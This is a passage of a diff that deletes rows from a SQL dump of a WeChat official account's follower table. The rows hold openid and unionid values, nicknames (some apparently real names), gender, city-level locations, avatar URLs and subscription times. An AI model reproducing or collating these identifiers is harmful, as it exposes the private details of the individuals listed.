-INSERT INTO `wechat_fans` VALUES (86, 'wx60a43dd8161666d4', 'oGsrks2nqZdraWnNb0GmagPhUvZY', 'o38gps7gEu0vznvTdofhX9FVqLMI', ',2,227,243,', 0, 1, 'Bill', 1, '中国', '广东', '广州', 'zh_CN', 'http://thirdwx.qlogo.cn/mmopen/lQEcz8ricSniaa2ZABsHxhbKUJibt7tn2HhvdkpibQQfMx6Eib9yNS9m7f3gRwnAXlylJS7lBqJuENLNc7qCWoONPsV76rOpH8Mqib/132', 1544510640, '2018-12-11 14:44:00', '', 'ADD_SCENE_QR_CODE', '0', '12345', '2021-01-08 13:47:44');
-INSERT INTO `wechat_fans` VALUES (87, 'wx60a43dd8161666d4', 'oGsrks9XBD7I8vJBYw0Um-x1vQxk', 'o38gps7_doPnGKUbJyHPEr_MlfWg', ',,', 0, 1, '心が属している', 1, '中国', '陕西', '西安', 'zh_CN', 'http://thirdwx.qlogo.cn/mmopen/ajNVdqHZLLCktXJOrLWr5M18DribDfzKA35hBTrVBlDfr56nCfNVyaG82s8AQCHhUR27xv07OsUEiaPypp2pZyXg/132', 1525709132, '2018-05-08 00:05:32', '', 'ADD_SCENE_OTHERS', '0', '', '2021-01-08 13:47:44');
-INSERT INTO `wechat_fans` VALUES (88, 'wx60a43dd8161666d4', 'oGsrkszdq0gzl5MyEyJRe6Evc-Uk', 'o38gps8ChEiBDDAT3MWZR0oyeu9E', ',,', 0, 1, 'LimHo', 1, '德国', '柏林', '', 'zh_CN', 'http://thirdwx.qlogo.cn/mmopen/ajNVdqHZLLByW37hP0eAPHBmxM4gsibYBumR2sWHUyDeASu8VL5hfEyguVR6QySPmxDoEJibyk4FVTx6LCemfoAQ/132', 1528361114, '2018-06-07 16:45:14', '', 'ADD_SCENE_QR_CODE', '0', '', '2021-01-08 13:47:44');
-INSERT INTO `wechat_fans` VALUES (89, 'wx60a43dd8161666d4', 'oGsrks2kyvsVE3Qd16AgoxaMW0hA', 'o38gpsyRXMa_TaR7-MvCGMhmjnec', ',,', 0, 1, '袁再强', 1, '中国', '浙江', '台州', 'zh_CN', 'http://thirdwx.qlogo.cn/mmopen/lQEcz8ricSng1fT8eQPwCxEFtmRTCia0hU3Qe2LqKdPnGjJ6KQVNoicDrGG6vah0picKmePqjeEIZBF2yvwcgxpp0A/132', 1532703309, '2018-07-27 22:55:09', '', 'ADD_SCENE_QR_CODE', '0', '', '2021-01-08 13:47:44');
-INSERT INTO `wechat_fans` VALUES (90, 'wx60a43dd8161666d4', 'oGsrks3QCAmS0w84Rz-vEId_vEjE', 'o38gpsyhNsz9oufVc9cJWX8YTkTE', ',,', 0, 0, 'Biao', 1, '中国', '广西', '南宁', 'zh_CN', 'http://thirdwx.qlogo.cn/mmopen/wLcWG0U6YFnLq4hSElRXEqHibwT5P6gee7Q9dk9ca8icSCBhHnTNbh9DbAllVg01jntILzH90NzjfcsxR2MUQzk9ic6ErSxsbUk/132', 1505788891, '2017-09-19 10:41:31', '', 'ADD_SCENE_SEARCH', '0', '', '2021-01-08 13:47:44');
-INSERT INTO `wechat_fans` VALUES (91, 'wx60a43dd8161666d4', 'oGsrks3lrsXq8RycWT3xNxEXiGUM', 'o38gps4Gzj1QPPrPtuAiK9vhmfDI', ',,', 0, 1, 'Aẓawan n waḍu', 1, '中国', '广东', '湛江', 'zh_CN', 'http://thirdwx.qlogo.cn/mmopen/lQEcz8ricSnhbRbj5X0QZ9gYbS4qzt9Zlp0BsCgiaZ06zZ3EZAZB50fqHTs0zKmGgTKhTOX4KViamtmtPXPy0DUvPwlwzpen3yw/132', 1604631090, '2020-11-06 10:51:30', '', 'ADD_SCENE_QR_CODE', '0', '', '2021-01-08 13:47:44');
-INSERT INTO `wechat_fans` VALUES (92, 'wx60a43dd8161666d4', 'oGsrks6H0hBnuX9dRGeqNQmoFm_Y', 'o38gps0ZJKvxjEc0N2BOgR-T1doM', ',,', 0, 1, 'Hoooooo！', 1, '安道尔', '', '', 'zh_CN', 'http://thirdwx.qlogo.cn/mmopen/cXaM0LzKLKqWzwNeqjpichElj72GhOBEBxhv5R1z0XNx9KmyliaQAAFX84tKNFkl8OkrrWpfN1l782IiaUdvtrxYgaia9Ebt57OM/132', 1513841189, '2017-12-21 15:26:29', '', 'ADD_SCENE_SEARCH', '0', '', '2021-01-08 13:47:44');
-INSERT INTO `wechat_fans` VALUES (93, 'wx60a43dd8161666d4', 'oGsrksxHcmjgfKLZbToYcFp1AeM4', 'o38gps5YcXI5uCI1FM6n2Y9BUptk', ',,', 0, 1, '远在咫尺', 1, '中国', '广西', '钦州', 'zh_CN', 'http://thirdwx.qlogo.cn/mmopen/cXaM0LzKLKreb251wicMDk2ibfKVr8nn182yBLdBUoDMvfapWicwI89b8E0QM8Uhqblcr3xPgwFaEhFibldMCIcQRSKiclmicqmxrl/132', 1578543697, '2020-01-09 12:21:37', '', 'ADD_SCENE_QR_CODE', '0', '', '2021-01-08 13:47:44');
-INSERT INTO `wechat_fans` VALUES (94, 'wx60a43dd8161666d4', 'oGsrkswrLrpbSvX4_tCxLVl8f4kg', 'o38gps0g0bwxdeVfrbY2LukeJ4Jk', ',2,', 0, 1, '米斯特@米斯小特', 1, '中国', '广西', '柳州', 'zh_CN', 'http://thirdwx.qlogo.cn/mmopen/Q3auHgzwzM6ehVyczYOJt2qloicUz8cPEV5eJhyZDgGO1yh0X5icxANEibHZTt2OqJnE4z0dIhf7ClMdPlEFKRxtMdeHxsJuRtGHCNcfIkjUb8/132', 1522733858, '2018-04-03 13:37:38', '', 'ADD_SCENE_QR_CODE', '0', '', '2021-01-08 13:47:44');
-INSERT INTO `wechat_fans` VALUES (95, 'wx60a43dd8161666d4', 'oGsrks3qgDEtDWNozPXZhUXY9CNw', 'o38gps--TWLpOSQuu1je3O8Kv6fY', ',,', 0, 1, ':oain', 1, '中国', '广东', '深圳', 'zh_CN', 'http://thirdwx.qlogo.cn/mmopen/lQEcz8ricSnhMibmQI6m43ia5iax37MzUJp7l91LkFpT7WWiaAYnrLI3Yq2t3bjpynLA6EiaMA7Xl5vFMialMmz3icFqk1ib2ylPFCvOic/132', 1606551715, '2020-11-28 16:21:55', '', 'ADD_SCENE_QR_CODE', '0', '', '2021-01-08 13:47:44');
-INSERT INTO `wechat_fans` VALUES (96, 'wx60a43dd8161666d4', 'oGsrks7uGTusOa_Jfh7bXFt3xrsI', 'o38gps9nKLqd1u6S9WOflRRAyXMY', ',,', 0, 1, '荒漠屠夫', 1, '中国', '浙江', '杭州', 'zh_CN', 'http://thirdwx.qlogo.cn/mmopen/wLcWG0U6YFmr7dAfxG0unbzibIu3mOeDVreibb17BaBGx9AuvTVFdiceBJN44F57lLcEt2wXecUEXZysLFHn4e7F2xfSeZKy2eo/132', 1592460048, '2020-06-18 14:00:48', '', 'ADD_SCENE_QR_CODE', '0', '', '2021-01-08 13:47:44');
-INSERT INTO `wechat_fans` VALUES (97, 'wx60a43dd8161666d4', 'oGsrks0QOm-Ub3EiVLp4rCIjMvCk', 'o38gps6Imix3AQIzG81jJ9oj7_V4', ',241,', 0, 1, '佰宝龙猫', 1, '中国', '福建', '福州', 'zh_CN', 'http://thirdwx.qlogo.cn/mmopen/lQEcz8ricSnhlmkw5WDLWlGHY1ClMs3obZAPLyicWHGIyZKvJWX5PfgMCwyalr5ZYibAA5fu33qOYsoOSO7ywRFmcj9kt4aFgoM/132', 1540783549, '2018-10-29 11:25:49', '', 'ADD_SCENE_QR_CODE', '0', '', '2021-01-08 13:47:44');
-INSERT INTO `wechat_fans` VALUES (98, 'wx60a43dd8161666d4', 'oGsrks7l57zX6SekGy0f2BmLEVJQ', 'o38gpsyOUOUIOIcMGmWWyXWV4pmo', ',2,', 0, 1, '神一样的男人', 1, '中国', '浙江', '温州', 'zh_CN', 'http://thirdwx.qlogo.cn/mmopen/wLcWG0U6YFmr7dAfxG0unfvLkc1ctn9DXAPVUMHEDje9NDxJtR2Xt6A3XUIdwhgMJtGp5ZwibAL5pN4l0aAq1lUCrcQkxSqb4/132', 1529650299, '2018-06-22 14:51:39', '', 'ADD_SCENE_QR_CODE', '0', '55', '2021-01-08 13:47:44');
-INSERT INTO `wechat_fans` VALUES (99, 'wx60a43dd8161666d4', 'oGsrks68I0iO8K1a-ovuXlQbe6ek', 'o38gps35ZFbur02-CpnFoCJ-a_BM', ',,', 0, 1, '代号为纯҈洁҈🙃', 2, '中国', '广东', '广州', 'zh_CN', 'http://thirdwx.qlogo.cn/mmopen/cXaM0LzKLKrBw3cFObrgH5sPDvLic7on8pdfrgRSVXicBEiaJ8XXsrojTGrOYfgpUbpTEOd1a2Gs19FsOePExr3FIYEUX7HnnPE/132', 1487058795, '2017-02-14 15:53:15', '', 'ADD_SCENE_OTHERS', '0', '', '2021-01-08 13:47:44');
-INSERT INTO `wechat_fans` VALUES (100, 'wx60a43dd8161666d4', 'oGsrks5oAnVDeARhvzJsXkv9cwj0', 'o38gps2FSyO8uilTJiC5RqaqPptQ', ',,', 0, 1, 'Miranda', 2, '中国', '广东', '广州', 'zh_CN', 'http://thirdwx.qlogo.cn/mmopen/tqRiaNianNl1mWdjxsYDFxLuibicnf90vxHX52UmU2pGsAk3aXI8EBic5tKIuGrIAGYVsZJrSXbFaur7SnO4YrHlW1QLaTzGx1ice2/132', 1461418982, '2016-04-23 21:43:02', '', 'ADD_SCENE_OTHERS', '0', '', '2021-01-08 13:47:44');
-INSERT INTO `wechat_fans` VALUES (101, 'wx60a43dd8161666d4', 'oGsrks6A9MtnPEJagwyYuF6-8Nwg', 'o38gpsypyRYaBO-6YsKP84f0vGxg', ',,', 0, 1, '祥哥建筑施工资质代办', 1, '中国', '辽宁', '沈阳', 'zh_CN', 'http://thirdwx.qlogo.cn/mmopen/KULsUKmynFu6SiahhNaO6M7yEdmIP1fVP4NT1QnIrov9jm4yQyp9r6wQdGZEIcBMPdafxRPuBeVwJhmkDgia88MctPF93F5Fgu/132', 1582679807, '2020-02-26 09:16:47', '', 'ADD_SCENE_QR_CODE', '0', '', '2021-01-08 13:47:46');
-INSERT INTO `wechat_fans` VALUES (102, 'wx60a43dd8161666d4', 'oGsrks_cMX730air6ZKOSPhUv5bI', 'o38gps5zUa08f5ivxsv10AqPVTM8', ',,', 0, 1, '阿科', 1, '中国', '湖北', '荆州', 'zh_CN', 'http://thirdwx.qlogo.cn/mmopen/lQEcz8ricSnhlmkw5WDLWlCrtvWZCGVUsTQpZzGR53Ykyg1rjg5jTWiaEDQKdtsewAwEXFavouZcwfOAF390ibDC9MXWOdoDwicy/132', 1517735573, '2018-02-04 17:12:53', '', 'ADD_SCENE_SEARCH', '0', '', '2021-01-08 13:47:46');
-INSERT INTO `wechat_fans` VALUES (103, 'wx60a43dd8161666d4', 'oGsrksyZXNWqO4y9Iz3K8EgJyVvs', 'o38gps06XAl50J74ZnfQp1vFqJ-U', ',,', 0, 1, '淘宝宝🎈', 1, '中国', '陕西', '西安', 'zh_CN', 'http://thirdwx.qlogo.cn/mmopen/lQEcz8ricSnhlmkw5WDLWlLCrzc1RWYy0RQThCol1XYwjRdj8PiaHrVic5HdudbYrRxRp9OX3y31wF4rnjD8kvJw7WLa3lO9Rv7/132', 1565310407, '2019-08-09 08:26:47', '', 'ADD_SCENE_QR_CODE', '0', '', '2021-01-08 13:47:46');
-INSERT INTO `wechat_fans` VALUES (104, 'wx60a43dd8161666d4', 'oGsrks8jlV1rMF6G66qj5PblyqoA', 'o38gps9sN93vtEkBT2xH3yeMZ5Vw', ',,', 0, 1, '6030', 0, '', '', '', 'zh_CN', 'http://thirdwx.qlogo.cn/mmopen/wLcWG0U6YFmg5BrQukEzgiaLA0Bf8oF1dVSicRSPictr4mXN7UPQZ5vwGSmmIYia1NuJ7PFDrxwnMrXvtMB0wianO7BxqjtXRlCam/132', 1565731505, '2019-08-14 05:25:05', '', 'ADD_SCENE_QR_CODE', '0', '', '2021-01-08 13:47:46');
-INSERT INTO `wechat_fans` VALUES (105, 'wx60a43dd8161666d4', 'oGsrksyJ9EZJAjlzQdZnGByZiwyE', 'o38gps9GErwzTtZPTiNPC9f8ay1s', ',2,', 0, 1, '昂', 2, '阿尔巴尼亚', '', '', 'zh_CN', 'http://thirdwx.qlogo.cn/mmopen/KULsUKmynFu6SiahhNaO6M3MunrZR1ACAIalhmLGWSs4RHhY6d4ibglBo5dIZF2nvIgKHO0OTEv6eLhEv2jXjHNlqmbJyenzKU/132', 1511158120, '2017-11-20 14:08:40', '', 'ADD_SCENE_SEARCH', '0', '', '2021-01-08 13:47:46');
-INSERT INTO `wechat_fans` VALUES (106, 'wx60a43dd8161666d4', 'oGsrks4_Z_lgmXKceWYTRB3TLX5A', 'o38gps5wHVuGWDiA_j0PT-9bhzzk', ',2,', 0, 1, 'ɌÁÇĤ', 1, '中国', '湖南', '长沙', 'zh_CN', 'http://thirdwx.qlogo.cn/mmopen/lQEcz8ricSnhlmkw5WDLWlHwPGSsXZOAKIufCzrhkejyN3WianDic3CstkiciaXeDiaTpjLGorR2iamdNPp7PxRzuc7x6RcqsOibu8Fw/132', 1526005045, '2018-05-11 10:17:25', '', 'ADD_SCENE_QR_CODE', '0', '', '2021-01-08 13:47:46');
-INSERT INTO `wechat_fans` VALUES (107, 'wx60a43dd8161666d4', 'oGsrksxuJOublV9Qyzgp2KyXhdKg', 'o38gps_m9icHZRSezFaGS6KKqLak', ',,', 0, 1, 'leshnn', 1, '中国', '广东', '广州', 'zh_CN', 'http://thirdwx.qlogo.cn/mmopen/lQEcz8ricSngy6ricJOyC2uXNibU5tMKeoXDZiaTbtEYLCSxmLF0RribU0tA7sxpaibrbxSJF4jmibrf3delkWmSBcAhMUd6UK8qGwt/132', 1580182198, '2020-01-28 11:29:58', '', 'ADD_SCENE_QR_CODE', '0', '', '2021-01-08 13:47:46');
-INSERT INTO `wechat_fans` VALUES (108, 'wx60a43dd8161666d4', 'oGsrksy1_hfCNM5FL381sUiEDom8', 'o38gpswLApWNURPRCRSIo0WljvpU', ',,', 0, 1, '腾飞', 1, '中国', '安徽', '亳州', 'zh_CN', 'http://thirdwx.qlogo.cn/mmopen/KULsUKmynFu6SiahhNaO6MxvicicIL10nnuCUk2op5z0GU0nRXa8OcwU8rshnJ3dnsdzS8h8icfQibO90nlUuibSs8X0Ry1d7ChAz5/132', 1605777009, '2020-11-19 17:10:09', '', 'ADD_SCENE_QR_CODE', '0', '善良', '2021-01-08 13:47:47');
-INSERT INTO `wechat_fans` VALUES (109, 'wx60a43dd8161666d4', 'oGsrks75QHSQZ10LNO-6M5cfSkXQ', 'o38gps8bnjsc8R9Y5bTPfS3W8dts', ',2,', 0, 1, '永文', 1, '中国', '河南', '济源', 'zh_CN', 'http://thirdwx.qlogo.cn/mmopen/KULsUKmynFu6SiahhNaO6M1SibOX2y4f2pPUnz96HCrWpQQpxDF90ZWia1bgcU8tIDIcPcBRuIWO1fSUDn6ruL0iceEoibPRibtE1h/132', 1531124671, '2018-07-09 16:24:31', '', 'ADD_SCENE_QR_CODE', '0', '', '2021-01-08 13:47:47');
-INSERT INTO `wechat_fans` VALUES (110, 'wx60a43dd8161666d4', 'oGsrkswvewcgA2obzWXeCj_yIHzs', 'o38gpsycVcwBKD3CfXL4hhzvOgt4', ',,', 0, 1, 'linf', 1, '中国', '云南', '昆明', 'zh_CN', 'http://thirdwx.qlogo.cn/mmopen/cXaM0LzKLKqWzwNeqjpichDKGicbuMuCVWvpmtU7Rk6DibSCCa429niaKhwOAibbt7aw9M77n2pz2g4UKqyngT0LCZJpibN4NPbhtc/132', 1495794329, '2017-05-26 18:25:29', '', 'ADD_SCENE_OTHERS', '0', '', '2021-01-08 13:47:47');
-INSERT INTO `wechat_fans` VALUES (111, 'wx60a43dd8161666d4', 'oGsrksxmbPwKz-MGZKc3FUgNIeOU', 'o38gps4jI25Hj9wP-eu0LoNQH9zU', ',,', 0, 1, '浩月当空', 1, '中国', '内蒙古', '包头', 'zh_CN', 'http://thirdwx.qlogo.cn/mmopen/tqRiaNianNl1mWdjxsYDFxLgghqkpeFIeQF2Js4lsrDCicgcygoNXQ0uu0C2AUvpFf2U3jIqVnPlWVG4tykNeFphQZYVvVQ8aDC/132', 1555389027, '2019-04-16 12:30:27', '', 'ADD_SCENE_QR_CODE', '0', '', '2021-01-08 13:47:47');
-INSERT INTO `wechat_fans` VALUES (112, 'wx60a43dd8161666d4', 'oGsrks2xiOxVbOWvaJYHEWkGxzWk', 'o38gps-cq3BpRloot4Zn_SgkERIU', ',,', 0, 1, '瑋瑋', 2, '中国', '湖南', '衡阳', 'zh_CN', 'http://thirdwx.qlogo.cn/mmopen/tqRiaNianNl1mWdjxsYDFxLgNia0zvtXj9NTLNic1btoLLpIGVu6CviafENqODPtZ4icH7YL07ImRciaEc6BwlJRmDxVfxic2pIiaeOTL/132', 1472542553, '2016-08-30 15:35:53', '', 'ADD_SCENE_OTHERS', '0', '', '2021-01-08 13:47:47');
-INSERT INTO `wechat_fans` VALUES (113, 'wx60a43dd8161666d4', 'oGsrks4j6Dgv0ZEF9eJqU_1aJJ6U', 'o38gps3EEPUdl9ZHCrpif2gtFZDI', ',,', 0, 1, '尹潇', 1, '中国', '江苏', '南京', 'zh_CN', 'http://thirdwx.qlogo.cn/mmopen/KULsUKmynFu6SiahhNaO6M0aY0hjiciadOY3kosBib9pVIZD5Wn0ibPnacQRRUyYWiad7nd7XLEe1aJZE6jZOPhF5byBI3AxricAPUD/132', 1597407276, '2020-08-14 20:14:36', '', 'ADD_SCENE_QR_CODE', '0', '', '2021-01-08 13:47:47');
-INSERT INTO `wechat_fans` VALUES (114, 'wx60a43dd8161666d4', 'oGsrks6SoYso94Z56phTkcfERGJU', 'o38gps70YF7VdtDbwbHLQI9uOTLY', ',,', 0, 1, '大海', 1, '中国', '安徽', '合肥', 'zh_CN', 'http://thirdwx.qlogo.cn/mmopen/tqRiaNianNl1lBlXFjzK7wQ1iaD5Ov83GiasrOY9tXdicQsZj14ts1GFdUZ2TIq9DnNkkhnG6cZSbakCx60KKiaNBnibkYtzOcdibadb/132', 1586313367, '2020-04-08 10:36:07', '', 'ADD_SCENE_QR_CODE', '0', '', '2021-01-08 13:47:47');
-INSERT INTO `wechat_fans` VALUES (115, 'wx60a43dd8161666d4', 'oGsrks0lA2-xKnn3ZD7Ni3lCGsbY', 'o38gps7XWZEQnOZlhjFeaOQNqYIU', ',,', 0, 1, '【啊May】媚', 2, '中国', '广东', '广州', 'zh_CN', 'http://thirdwx.qlogo.cn/mmopen/cXaM0LzKLKqWzwNeqjpichOzomu2KN0brh58l35Nr2DXf7MiaBCyXqpdxBY3T8SGPSSyrAPBbziaIEsSk0YfnibwthVleroRg1MA/132', 1602215184, '2020-10-09 11:46:24', '', 'ADD_SCENE_QR_CODE', '0', '', '2021-01-08 13:47:47');
-INSERT INTO `wechat_fans` VALUES (116, 'wx60a43dd8161666d4', 'oGsrks034n13vlwJNjy26PT_PbBk', 'o38gps2lUG5cWTr1IpcOw6h1N384', ',,', 0, 1, '我有超能力。', 2, '中国', '山东', '日照', 'zh_CN', 'http://thirdwx.qlogo.cn/mmopen/lQEcz8ricSnhlmkw5WDLWlHAym8rg205oQTbjvthhRicrDV00c0lmlBa5IkFHRsrhS4A6YaBuiaS6UXNr6zDoEJJLoWAxkF78Wj/132', 1603605672, '2020-10-25 14:01:12', '', 'ADD_SCENE_QR_CODE', '0', '', '2021-01-08 13:47:47');
-INSERT INTO `wechat_fans` VALUES (117, 'wx60a43dd8161666d4', 'oGsrks0jW9y25wKFxLurrUPrxvFw', 'o38gps-VE_f7mOEfN5NRf9fzYLNg', ',2,', 0, 1, '暴躁的jk苏', 1, '中国', '广东', '广州', 'zh_CN', 'http://thirdwx.qlogo.cn/mmopen/tqRiaNianNl1mWdjxsYDFxLjE1gRKdbiaibvesz4iaXN4wCEJX49wKuVUhlCny7U9sK7IHS4YVlxHhicWH9BOMr6PmGSH9Ria4SJ9Fo/132', 1476260898, '2016-10-12 16:28:18', '', 'ADD_SCENE_OTHERS', '0', '', '2021-01-08 13:47:47');
-INSERT INTO `wechat_fans` VALUES (118, 'wx60a43dd8161666d4', 'oGsrks0RY3eiytuk9IDGNxXZlIcE', 'o38gpsxUzKOepgxix1mnaQe3A0N4', ',,', 0, 1, '龙witt', 1, '中国', '河南', '洛阳', 'zh_CN', 'http://thirdwx.qlogo.cn/mmopen/lQEcz8ricSnjV07Izd3icYj6KGcORscJVibo0F35hfetCk4VyYkTq3Qe7PEBnzibnKCOo9wmw3zylHwAVDHJsibgTWbATAxKkktCD/132', 1602835513, '2020-10-16 16:05:13', '', 'ADD_SCENE_QR_CODE', '0', '测试', '2021-01-08 13:47:47');
-INSERT INTO `wechat_fans` VALUES (119, 'wx60a43dd8161666d4', 'oGsrks4VBHbqs2SxQ0609pRM1vH8', 'o38gps2idCh8YqRLoPsefLL2oHAk', ',2,', 0, 1, '零点', 1, '百慕大', '', '', 'zh_CN', 'http://thirdwx.qlogo.cn/mmopen/lQEcz8ricSnhlmkw5WDLWlPmBibkPfbc8YmOiaSpSnvmQInfUf9Bf0iaKAQHVsoIovW2NPicaibLO0qcLhLiaxia7icLgDqoGMg5uZEWY/132', 1525703752, '2018-05-07 22:35:52', '', 'ADD_SCENE_QR_CODE', '0', '222', '2021-01-08 13:47:47');
-INSERT INTO `wechat_fans` VALUES (120, 'wx60a43dd8161666d4', 'oGsrksyjW9dK0ZTI_ymiTVpp4bd0', 'o38gps9lQUwPERa6xZR1dCq_FjRk', ',,', 0, 1, 'Jalon', 1, '中国', '', '', 'zh_CN', 'http://thirdwx.qlogo.cn/mmopen/wLcWG0U6YFmr7dAfxG0unZCQrR9R3x6uy6CAzkL927UqdRXtgxSTgicmW0fsBSqQB9AdAibmfFGYOwgqCN642Y5YVNxf6ibxGeX/132', 1529237070, '2018-06-17 20:04:30', '', 'ADD_SCENE_QR_CODE', '0', '', '2021-01-08 13:47:47');
-INSERT INTO `wechat_fans` VALUES (121, 'wx60a43dd8161666d4', 'oGsrks2HYfmN6FlAKyiYHQQV_N1s', 'o38gps8Sa2N4MVzhufn-TzIna05I', ',,', 0, 1, '达', 1, '中国', '福建', '厦门', 'zh_CN', 'http://thirdwx.qlogo.cn/mmopen/lQEcz8ricSnhlmkw5WDLWlBFudhDYQYwIicL201q9Tt0s7C2myzfAROsiaUuMPtAGgoBlZhzeBMMAWia7iaibX12vCiaMQFk31xbwQd/132', 1585118933, '2020-03-25 14:48:53', '', 'ADD_SCENE_QR_CODE', '0', '', '2021-01-08 13:47:47');
-INSERT INTO `wechat_fans` VALUES (122, 'wx60a43dd8161666d4', 'oGsrks3bi69ROBM7wdcnwLiCJN7g', 'o38gps0kRV2gBR97_kn69yXfiQ4o', ',,', 0, 1, 'zhāng', 1, '中国', '江苏', '南京', 'zh_CN', 'http://thirdwx.qlogo.cn/mmopen/wLcWG0U6YFmr7dAfxG0unWtp4MV83EXsWgftJxbx9xZThCrLicLiaVN2z9UmLzWiarhHU8F29QxJFK6tKWJeYNVxgUrlbqmlnMic/132', 1512742506, '2017-12-08 22:15:06', '', 'ADD_SCENE_SEARCH', '0', '', '2021-01-08 13:47:47');
-INSERT INTO `wechat_fans` VALUES (123, 'wx60a43dd8161666d4', 'oGsrkswerFlRUVrugU0Na7vKTwTI', 'o38gps7K_p-A07YnCQ5HnX8KOskY', ',,', 0, 1, '😁 😁', 1, '冰岛', '', '', 'zh_CN', 'http://thirdwx.qlogo.cn/mmopen/wLcWG0U6YFmr7dAfxG0unXQkGFAhMXutNvdZDzGYialsYWvEooJq85ic5bzp2mrHc7ZVsab3o4mibJ9VQGKJ9niavYkd7DnibuZEs/132', 1562401230, '2019-07-06 16:20:30', '', 'ADD_SCENE_SEARCH', '0', '', '2021-01-08 13:47:47');
-INSERT INTO `wechat_fans` VALUES (124, 'wx60a43dd8161666d4', 'oGsrksxXiSBXnE0xBkSC3xWYb7uU', 'o38gps8yZrJD1H02Z2Z15kjf7NII', ',,', 0, 1, 'MasterY', 1, '阿鲁巴', '', '', 'zh_CN', 'http://thirdwx.qlogo.cn/mmopen/wLcWG0U6YFkRZo5edAzqoicmlejO7XfLNtO5ibHSyKQY25BChx6Yh5vQk53h2DuXU5a6Xgmy7DrCibSlukAwhYw1EGEgsWMpCUc/132', 1572834059, '2019-11-04 10:20:59', '', 'ADD_SCENE_SEARCH', '0', '', '2021-01-08 13:47:47');
-INSERT INTO `wechat_fans` VALUES (126, 'wx60a43dd8161666d4', 'oGsrks08c6gc1Z3NMgJeU7Y3oZnM', 'o38gps633HtKPDreE-Cc4USywnsc', ',227,', 0, 1, '杜先生', 1, '安道尔', '', '', 'zh_CN', 'http://thirdwx.qlogo.cn/mmopen/wLcWG0U6YFnj0T2gicl9MPv2AAmPRibymgbValqqOUyDeBtXjwC3aLicUsWIKyc9ib5RqwOeLvZVsXp179kbibp7eRYkab4hUicAVq/132', 1533001921, '2018-07-31 09:52:01', '', 'ADD_SCENE_QR_CODE', '0', '', '2021-01-08 13:47:47');
-INSERT INTO `wechat_fans` VALUES (127, 'wx60a43dd8161666d4', 'oGsrksxBQW56NSMZvXuBDIDJh1iM', 'o38gps2sIrPg2g74VLwGgY-FRQz4', ',,', 0, 1, 'Eugene Yu', 1, '中国', '四川', '成都', 'zh_CN', 'http://thirdwx.qlogo.cn/mmopen/Q3auHgzwzM7sk1IrZ7LEPG52cktWKpB0f2xYzsxWJOBibfS6Ct9R2ZGyL61h43Y2gzrg43qSicXySfgpCZvROhYZotheVjib460icowbZ4UdfiaI/132', 1502625756, '2017-08-13 20:02:36', '', 'ADD_SCENE_SEARCH', '0', '', '2021-01-08 13:47:47');
-INSERT INTO `wechat_fans` VALUES (128, 'wx60a43dd8161666d4', 'oGsrks9P7TsDqZL-zB-m43Ekspi4', 'o38gps0XMYTVSVmNqlDmgbzryzdY', ',,', 0, 1, '王兴伍', 1, '中国', '北京', '朝阳', 'zh_CN', 'http://thirdwx.qlogo.cn/mmopen/cXaM0LzKLKqWzwNeqjpichP16CibxXTB7j03HLj9ANjynbLe6aJpB4xsek4z4UqFlNfaQRbjDkuiacwg8MOqe8zuZNqONibutRwM/132', 1552979757, '2019-03-19 15:15:57', '', 'ADD_SCENE_QR_CODE', '0', '', '2021-01-08 13:47:47');
-INSERT INTO `wechat_fans` VALUES (129, 'wx60a43dd8161666d4', 'oGsrks4gMjJSBSWQbtyxwJiZQj18', 'o38gps0Trh8Ggyc7mwBH2XIRIAEc', ',2,', 0, 1, 'Mr. La', 1, '中国', '青海', '西宁', 'zh_CN', 'http://thirdwx.qlogo.cn/mmopen/lQEcz8ricSnhlmkw5WDLWlIw66OXtcgoHictuwB6ZyWRQGOkSeEuibMytbxyZvPmM6r1HJHdia4Hgr07toMBj4PczIlfjnIVAtaB/132', 1516598324, '2018-01-22 13:18:44', '', 'ADD_SCENE_SEARCH', '0', '', '2021-01-08 13:47:47');
-INSERT INTO `wechat_fans` VALUES (130, 'wx60a43dd8161666d4', 'oGsrks1ptDJ5so-RBby5Oabx23mU', 'o38gpswuLqrUQTGYkeaBS66yBHWc', ',2,241,', 0, 1, '喜欢一个人ღ', 1, '中国', '湖北', '武汉', 'zh_CN', 'http://thirdwx.qlogo.cn/mmopen/cXaM0LzKLKrn8y1lxTpMlGTmicLpDDXNE3zN3yKZyRVBHk1AHiaAmBVuoUbW7EEw8mgo6greyNnhn1iadWzGqkzjAmwFnKuPJiaJ/132', 1534310999, '2018-08-15 13:29:59', '', 'ADD_SCENE_QR_CODE', '0', '红包', '2021-01-08 13:47:47');
-INSERT INTO `wechat_fans` VALUES (131, 'wx60a43dd8161666d4', 'oGsrks5sAyLMOJ3PPJGNdsmP6h1c', 'o38gpszaBKphV_UFktrUqsPR6urI', ',,', 0, 1, '海', 1, '中国', '江苏', '无锡', 'zh_CN', 'http://thirdwx.qlogo.cn/mmopen/wLcWG0U6YFmr7dAfxG0unfpabCqCF2bxRP2Wvy0pexFGvoLEGqf2CJnBaBhMOI0FS1Zg3TB1TJialTwXNclWicbkvaljsSPO0j/132', 1522660780, '2018-04-02 17:19:40', '', 'ADD_SCENE_QR_CODE', '0', '', '2021-01-08 13:47:47');
-INSERT INTO `wechat_fans` VALUES (132, 'wx60a43dd8161666d4', 'oGsrks5arhP8js3-C_Mc2tLOaB34', 'o38gps5soAzcDO6PvbTz3XE88VIY', ',2,', 0, 1, 'WGZXU', 2, '中国', '广东', '广州', 'zh_CN', 'http://thirdwx.qlogo.cn/mmopen/cXaM0LzKLKqWzwNeqjpichHB7SnWLogr9fYaTCsjAUFlsZkeQdibfYsc2aCkoHF8X9nO1reJMicvDl9205faJ87G60YcXADq5tE/132', 1472019816, '2016-08-24 14:23:36', '', 'ADD_SCENE_OTHERS', '0', '', '2021-01-08 13:47:47');
-INSERT INTO `wechat_fans` VALUES (133, 'wx60a43dd8161666d4', 'oGsrks9Bl7SPEjPgN-ui3eFMhDog', 'o38gpszG6ZnGcvNV7feJnT70MCkI', ',,', 0, 1, 'Apple', 1, '中国', '湖南', '长沙', 'zh_CN', 'http://thirdwx.qlogo.cn/mmopen/lQEcz8ricSnhlmkw5WDLWlEnmqkvBYMlmYibDElPS7icwAFMnBH0CATjnfXCmm3UxkRuKlZ3aiaNZkNGbLMmkR7o9U4auEia5f8lL/132', 1496744829, '2017-06-06 18:27:09', '', 'ADD_SCENE_OTHERS', '0', '', '2021-01-08 13:47:47');
